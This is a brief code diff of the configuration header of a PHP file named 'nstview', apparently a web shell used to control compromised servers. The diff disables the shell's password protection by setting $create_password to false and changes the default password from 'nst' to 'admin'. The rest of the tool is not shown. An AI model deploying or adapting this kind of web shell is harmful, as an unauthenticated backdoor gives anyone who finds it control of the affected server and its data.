@@ -1,12 +1,12 @@
-<?
+<?php
 @session_start();
 @set_time_limit(0);
 @set_magic_quotes_runtime(0);
 error_reporting(E_ALL & ~E_NOTICE);
 #####cfg#####
 # use password  true / false #
-$create_password = true;
-$password = "nst";    // default password for nstview, you can change it.
+$create_password = false;
+$password = "admin";    // default password for nstview, you can change it.
 
 # UNIX COMMANDS
 # description (nst) command
